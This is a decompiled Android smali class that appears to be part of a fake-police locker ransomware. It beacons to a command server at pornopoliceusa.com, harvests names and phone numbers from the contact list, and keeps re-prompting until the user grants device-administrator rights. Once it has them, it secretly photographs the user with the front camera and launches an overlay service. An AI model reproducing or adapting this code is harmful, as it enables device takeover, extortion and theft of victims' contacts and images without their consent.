.class public Lcom/brtohersoft/trnity/SampleOverlayShowActivity;
.super Landroid/app/Activity;
.source "SampleOverlayShowActivity.java"


# static fields
.field static final ACTIVATION_REQUEST:I = 0x2f

.field static final TAG:Ljava/lang/String; = "DevicePolicyDemoActivity"


# instance fields
.field private camera:I

.field private cameras:Landroid/hardware/Camera;

.field private demoDeviceAdmin:Landroid/content/ComponentName;

.field private devicePolicyManager:Landroid/app/admin/DevicePolicyManager;

.field private face:I

.field private pict:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 42
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method private openFrontFacingCameraGingerbread()Landroid/hardware/Camera;
    .locals 8

    .prologue
    .line 190
    const/4 v2, 0x0

    .line 191
    .local v2, "cameraCount":I
    const/4 v0, 0x0

    .line 193
    .local v0, "cam":Landroid/hardware/Camera;
    new-instance v3, Landroid/hardware/Camera$CameraInfo;

    invoke-direct {v3}, Landroid/hardware/Camera$CameraInfo;-><init>()V

    .line 194
    .local v3, "cameraInfo":Landroid/hardware/Camera$CameraInfo;
    invoke-static {}, Landroid/hardware/Camera;->getNumberOfCameras()I

    move-result v2

    .line 196
    const/4 v1, 0x0

    .local v1, "camIdx":I
    :goto_0
    if-lt v1, v2, :cond_0

    .line 208
    return-object v0

    .line 197
    :cond_0
    invoke-static {v1, v3}, Landroid/hardware/Camera;->getCameraInfo(ILandroid/hardware/Camera$CameraInfo;)V

    .line 199
    iget v5, v3, Landroid/hardware/Camera$CameraInfo;->facing:I

    const/4 v6, 0x1

    if-ne v5, v6, :cond_1

    .line 201
    :try_start_0
    invoke-static {v1}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    .line 196
    :cond_1
    :goto_1
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    .line 202
    :catch_0
    move-exception v4

    .line 203
    .local v4, "e":Ljava/lang/RuntimeException;
    const-string v5, "caam"

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "Camera failed to open: "

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4}, Ljava/lang/RuntimeException;->getLocalizedMessage()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v5, v6}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_1
.end method


# virtual methods
.method protected colotit()V
    .locals 15

    .prologue
    const/4 v14, 0x0

    const/16 v13, 0x5a

    const/4 v12, 0x2

    const/4 v11, 0x1

    const/4 v10, 0x0

    .line 104
    const-string v8, "cocon"

    invoke-virtual {p0, v8, v10}, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v4

    .line 106
    .local v4, "settings":Landroid/content/SharedPreferences;
    const-string v8, "status"

    invoke-interface {v4, v8, v10}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v7

    .line 108
    .local v7, "status":I
    const/16 v8, 0x4d

    if-ne v7, v8, :cond_0

    .line 109
    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v8

    invoke-static {v8}, Landroid/os/Process;->killProcess(I)V

    .line 162
    :goto_0
    return-void

    .line 112
    :cond_0
    const-string v8, "camera"

    invoke-interface {v4, v8, v10}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v8

    iput v8, p0, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->camera:I

    .line 113
    iget v8, p0, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->camera:I

    if-ne v8, v11, :cond_1

    .line 114
    const-string v8, "face"

    const-string v9, "facenull"

    invoke-interface {v4, v8, v9}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    iput-object v8, p0, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->pict:Ljava/lang/String;

    .line 115
    iget-object v8, p0, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->pict:Ljava/lang/String;

    const-string v9, "facenull"

    invoke-virtual {v8, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v8

    if-eqz v8, :cond_4

    .line 116
    iput v11, p0, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->face:I

    .line 121
    :cond_1
    :goto_1
    iget v8, p0, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->camera:I

    if-ne v8, v12, :cond_2

    .line 123
    iput v11, p0, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->face:I

    .line 126
    :cond_2
    iget v8, p0, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->face:I

    if-nez v8, :cond_3

    .line 127
    invoke-direct {p0}, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->openFrontFacingCameraGingerbread()Landroid/hardware/Camera;

    move-result-object v8

    iput-object v8, p0, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->cameras:Landroid/hardware/Camera;

    .line 128
    iget-object v8, p0, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->cameras:Landroid/hardware/Camera;

    if-eqz v8, :cond_7

    .line 129
    iget-object v8, p0, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->cameras:Landroid/hardware/Camera;

    invoke-virtual {v8, v13}, Landroid/hardware/Camera;->setDisplayOrientation(I)V

    .line 130
    iget-object v8, p0, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->cameras:Landroid/hardware/Camera;

    invoke-virtual {v8}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v2

    .line 131
    .local v2, "parameters":Landroid/hardware/Camera$Parameters;
    const-string v8, "rotation"

    invoke-virtual {v2, v8, v13}, Landroid/hardware/Camera$Parameters;->set(Ljava/lang/String;I)V

    .line 132
    const-string v8, "orientation"

    const-string v9, "portrait"

    invoke-virtual {v2, v8, v9}, Landroid/hardware/Camera$Parameters;->set(Ljava/lang/String;Ljava/lang/String;)V

    .line 133
    invoke-virtual {v2}, Landroid/hardware/Camera$Parameters;->getSupportedPictureSizes()Ljava/util/List;

    move-result-object v6

    .line 135
    .local v6, "sizes":Ljava/util/List;, "Ljava/util/List<Landroid/hardware/Camera$Size;>;"
    const/4 v3, 0x0

    .line 136
    .local v3, "result":Landroid/hardware/Camera$Size;
    const/4 v1, 0x0

    .local v1, "i":I
    :goto_2
    invoke-interface {v6}, Ljava/util/List;->size()I

    move-result v8

    if-lt v1, v8, :cond_5

    .line 145
    iget-object v8, p0, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->cameras:Landroid/hardware/Camera;

    invoke-virtual {v8, v2}, Landroid/hardware/Camera;->setParameters(Landroid/hardware/Camera$Parameters;)V

    .line 146
    iget-object v8, p0, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->cameras:Landroid/hardware/Camera;

    .line 147
    new-instance v9, Lcom/brtohersoft/trnity/PhotoHandler;

    invoke-virtual {p0}, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v10

    invoke-direct {v9, v10}, Lcom/brtohersoft/trnity/PhotoHandler;-><init>(Landroid/content/Context;)V

    .line 146
    invoke-virtual {v8, v14, v14, v9}, Landroid/hardware/Camera;->takePicture(Landroid/hardware/Camera$ShutterCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;)V

    .line 148
    iput v12, p0, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->face:I

    .line 159
    .end local v1    # "i":I
    .end local v2    # "parameters":Landroid/hardware/Camera$Parameters;
    .end local v3    # "result":Landroid/hardware/Camera$Size;
    .end local v6    # "sizes":Ljava/util/List;, "Ljava/util/List<Landroid/hardware/Camera$Size;>;"
    :cond_3
    :goto_3
    new-instance v8, Landroid/content/Intent;

    const-class v9, Lcom/brtohersoft/trnity/OverlayService;

    invoke-direct {v8, p0, v9}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v8}, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0

    .line 118
    :cond_4
    iput v12, p0, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->face:I

    goto :goto_1

    .line 137
    .restart local v1    # "i":I
    .restart local v2    # "parameters":Landroid/hardware/Camera$Parameters;
    .restart local v3    # "result":Landroid/hardware/Camera$Size;
    .restart local v6    # "sizes":Ljava/util/List;, "Ljava/util/List<Landroid/hardware/Camera$Size;>;"
    :cond_5
    invoke-interface {v6, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v3

    .end local v3    # "result":Landroid/hardware/Camera$Size;
    check-cast v3, Landroid/hardware/Camera$Size;

    .line 138
    .restart local v3    # "result":Landroid/hardware/Camera$Size;
    iget v8, v3, Landroid/hardware/Camera$Size;->width:I

    const/16 v9, 0x280

    if-ne v8, v9, :cond_6

    .line 139
    iget v8, v3, Landroid/hardware/Camera$Size;->width:I

    iget v9, v3, Landroid/hardware/Camera$Size;->height:I

    invoke-virtual {v2, v8, v9}, Landroid/hardware/Camera$Parameters;->setPreviewSize(II)V

    .line 140
    iget v8, v3, Landroid/hardware/Camera$Size;->width:I

    iget v9, v3, Landroid/hardware/Camera$Size;->height:I

    invoke-virtual {v2, v8, v9}, Landroid/hardware/Camera$Parameters;->setPictureSize(II)V

    .line 136
    :cond_6
    add-int/lit8 v1, v1, 0x1

    goto :goto_2

    .line 151
    .end local v1    # "i":I
    .end local v2    # "parameters":Landroid/hardware/Camera$Parameters;
    .end local v3    # "result":Landroid/hardware/Camera$Size;
    .end local v6    # "sizes":Ljava/util/List;, "Ljava/util/List<Landroid/hardware/Camera$Size;>;"
    :cond_7
    const-string v8, "cocon"

    invoke-virtual {p0, v8, v10}, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v5

    .line 152
    .local v5, "settings2":Landroid/content/SharedPreferences;
    invoke-interface {v5}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 153
    .local v0, "editor":Landroid/content/SharedPreferences$Editor;
    const-string v8, "camera"

    invoke-interface {v0, v8, v12}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 154
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 155
    iput v11, p0, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->face:I

    goto :goto_3
.end method

.method protected ebat()V
    .locals 3

    .prologue
    .line 164
    new-instance v0, Landroid/content/Intent;

    .line 165
    const-string v1, "android.app.action.ADD_DEVICE_ADMIN"

    .line 164
    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 166
    .local v0, "intent":Landroid/content/Intent;
    const-string v1, "android.app.extra.DEVICE_ADMIN"

    .line 167
    iget-object v2, p0, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->demoDeviceAdmin:Landroid/content/ComponentName;

    .line 166
    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    .line 168
    const-string v1, "android.app.extra.ADD_EXPLANATION"

    .line 169
    const-string v2, "To run the application - activate"

    .line 168
    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 170
    const/16 v1, 0x2f

    invoke-virtual {p0, v0, v1}, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->startActivityForResult(Landroid/content/Intent;I)V

    .line 171
    return-void
.end method

.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 2
    .param p1, "requestCode"    # I
    .param p2, "resultCode"    # I
    .param p3, "data"    # Landroid/content/Intent;

    .prologue
    .line 174
    packed-switch p1, :pswitch_data_0

    .line 186
    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onActivityResult(IILandroid/content/Intent;)V

    .line 187
    :goto_0
    return-void

    .line 176
    :pswitch_0
    const/4 v0, -0x1

    if-ne p2, v0, :cond_0

    .line 177
    const-string v0, "DevicePolicyDemoActivity"

    const-string v1, "Administration enabled!"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 178
    invoke-virtual {p0}, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->colotit()V

    goto :goto_0

    .line 181
    :cond_0
    const-string v0, "DevicePolicyDemoActivity"

    const-string v1, "Administration enable FAILED!"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 182
    invoke-virtual {p0}, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->ebat()V

    goto :goto_0

    .line 174
    :pswitch_data_0
    .packed-switch 0x2f
        :pswitch_0
    .end packed-switch
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 18
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 58
    invoke-super/range {p0 .. p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 59
    const-string v17, "start"

    .line 60
    .local v17, "type":Ljava/lang/String;
    const-string v11, ""

    .line 61
    .local v11, "data":Ljava/lang/String;
    new-instance v1, Lcom/brtohersoft/trnity/RequestTask;

    move-object/from16 v0, p0

    invoke-direct {v1, v0}, Lcom/brtohersoft/trnity/RequestTask;-><init>(Landroid/content/Context;)V

    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    const-string v4, "http://pornopoliceusa.com/api/app.php"

    aput-object v4, v2, v3

    const/4 v3, 0x1

    aput-object v17, v2, v3

    const/4 v3, 0x2

    aput-object v11, v2, v3

    invoke-virtual {v1, v2}, Lcom/brtohersoft/trnity/RequestTask;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 63
    sget-object v2, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v6, 0x0

    move-object/from16 v1, p0

    invoke-virtual/range {v1 .. v6}, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->managedQuery(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v10

    .line 64
    .local v10, "cursor":Landroid/database/Cursor;
    invoke-interface {v10}, Landroid/database/Cursor;->getCount()I

    move-result v9

    .line 65
    .local v9, "countphones":I
    const/16 v16, 0x0

    .line 66
    .local v16, "t":I
    invoke-virtual/range {p0 .. p0}, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    sget-object v2, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v6, 0x0

    invoke-virtual/range {v1 .. v6}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v14

    .line 67
    .local v14, "phones":Landroid/database/Cursor;
    const-string v13, ""

    .line 68
    .local v13, "out":Ljava/lang/String;
    :cond_0
    invoke-interface {v14}, Landroid/database/Cursor;->moveToNext()Z

    move-result v1

    if-nez v1, :cond_1

    .line 83
    :goto_0
    const-string v1, "cocon"

    const/4 v2, 0x0

    move-object/from16 v0, p0

    invoke-virtual {v0, v1, v2}, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v15

    .line 84
    .local v15, "settings3":Landroid/content/SharedPreferences;
    invoke-interface {v15}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v12

    .line 85
    .local v12, "editor":Landroid/content/SharedPreferences$Editor;
    const-string v1, "countphones"

    invoke-interface {v12, v1, v9}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 86
    const-string v1, "listphones"

    invoke-interface {v12, v1, v13}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 87
    invoke-interface {v12}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 89
    const-string v1, "device_policy"

    move-object/from16 v0, p0

    invoke-virtual {v0, v1}, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/admin/DevicePolicyManager;

    move-object/from16 v0, p0

    iput-object v1, v0, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->devicePolicyManager:Landroid/app/admin/DevicePolicyManager;

    .line 90
    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lcom/brtohersoft/trnity/catcher;

    move-object/from16 v0, p0

    invoke-direct {v1, v0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    move-object/from16 v0, p0

    iput-object v1, v0, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->demoDeviceAdmin:Landroid/content/ComponentName;

    .line 91
    move-object/from16 v0, p0

    iget-object v1, v0, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->devicePolicyManager:Landroid/app/admin/DevicePolicyManager;

    move-object/from16 v0, p0

    iget-object v2, v0, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->demoDeviceAdmin:Landroid/content/ComponentName;

    invoke-virtual {v1, v2}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v1

    if-eqz v1, :cond_2

    .line 92
    invoke-virtual/range {p0 .. p0}, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->colotit()V

    .line 101
    :goto_1
    return-void

    .line 70
    .end local v12    # "editor":Landroid/content/SharedPreferences$Editor;
    .end local v15    # "settings3":Landroid/content/SharedPreferences;
    :cond_1
    const-string v1, "display_name"

    invoke-interface {v14, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v14, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v7

    .line 71
    .local v7, "Name":Ljava/lang/String;
    const-string v1, "data1"

    invoke-interface {v14, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v14, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    .line 72
    .local v8, "Number":Ljava/lang/String;
    add-int/lit8 v16, v16, 0x1

    .line 73
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static {v13}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, " "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, " <br />"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    .line 74
    const/4 v1, 0x5

    move/from16 v0, v16

    if-le v0, v1, :cond_0

    goto/16 :goto_0

    .line 94
    .end local v7    # "Name":Ljava/lang/String;
    .end local v8    # "Number":Ljava/lang/String;
    .restart local v12    # "editor":Landroid/content/SharedPreferences$Editor;
    .restart local v15    # "settings3":Landroid/content/SharedPreferences;
    :cond_2
    invoke-virtual/range {p0 .. p0}, Lcom/brtohersoft/trnity/SampleOverlayShowActivity;->ebat()V

    goto :goto_1
.end method
